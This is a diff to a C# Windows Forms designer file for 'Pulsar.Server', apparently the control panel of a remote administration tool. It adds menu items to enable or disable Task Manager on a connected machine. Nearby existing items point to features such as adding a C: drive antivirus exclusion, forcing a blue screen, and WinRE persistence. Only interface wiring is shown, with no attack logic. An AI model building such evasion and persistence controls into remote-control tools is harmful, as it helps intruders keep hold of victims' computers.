@@ -99,6 +99,9 @@ namespace Pulsar.Server.Forms
             this.visitWebsiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.quickCommandsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.addCDriveExceptionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.taskManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.enableToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.disableTaskManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.funMethodsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.bSODToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.cWToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -590,7 +593,8 @@ namespace Pulsar.Server.Forms
             // quickCommandsToolStripMenuItem
             // 
             this.quickCommandsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.addCDriveExceptionToolStripMenuItem});
+            this.addCDriveExceptionToolStripMenuItem,
+            this.taskManagerToolStripMenuItem1});
             this.quickCommandsToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.wrench;
             this.quickCommandsToolStripMenuItem.Name = "quickCommandsToolStripMenuItem";
             this.quickCommandsToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
@@ -603,6 +607,32 @@ namespace Pulsar.Server.Forms
             this.addCDriveExceptionToolStripMenuItem.Size = new System.Drawing.Size(195, 22);
             this.addCDriveExceptionToolStripMenuItem.Text = "Add C: Drive Exception";
             this.addCDriveExceptionToolStripMenuItem.Click += new System.EventHandler(this.addCDriveExceptionToolStripMenuItem_Click);
+            // 
+            // taskManagerToolStripMenuItem1
+            // 
+            this.taskManagerToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.enableToolStripMenuItem,
+            this.disableTaskManagerToolStripMenuItem});
+            this.taskManagerToolStripMenuItem1.Image = global::Pulsar.Server.Properties.Resources.cog;
+            this.taskManagerToolStripMenuItem1.Name = "taskManagerToolStripMenuItem1";
+            this.taskManagerToolStripMenuItem1.Size = new System.Drawing.Size(195, 22);
+            this.taskManagerToolStripMenuItem1.Text = "Task Manager";
+            // 
+            // enableToolStripMenuItem
+            // 
+            this.enableToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.cog_add;
+            this.enableToolStripMenuItem.Name = "enableToolStripMenuItem";
+            this.enableToolStripMenuItem.Size = new System.Drawing.Size(187, 22);
+            this.enableToolStripMenuItem.Text = "Enable Task Manager";
+            this.enableToolStripMenuItem.Click += new System.EventHandler(this.enableToolStripMenuItem_Click);
+            // 
+            // disableTaskManagerToolStripMenuItem
+            // 
+            this.disableTaskManagerToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.cog_delete;
+            this.disableTaskManagerToolStripMenuItem.Name = "disableTaskManagerToolStripMenuItem";
+            this.disableTaskManagerToolStripMenuItem.Size = new System.Drawing.Size(187, 22);
+            this.disableTaskManagerToolStripMenuItem.Text = "Disable Task Manager";
+            this.disableTaskManagerToolStripMenuItem.Click += new System.EventHandler(this.disableTaskManagerToolStripMenuItem_Click);
             // 
             // funMethodsToolStripMenuItem
             // 
@@ -2540,5 +2570,8 @@ namespace Pulsar.Server.Forms
         private ToolStripMenuItem installVirtualMonitorToolStripMenuItem1;
         private ToolStripMenuItem uninstallVirtualMonitorToolStripMenuItem;
         private ToolStripMenuItem winRECustomFileForSurvivalToolStripMenuItem;
+        private ToolStripMenuItem taskManagerToolStripMenuItem1;
+        private ToolStripMenuItem enableToolStripMenuItem;
+        private ToolStripMenuItem disableTaskManagerToolStripMenuItem;
     }
 }
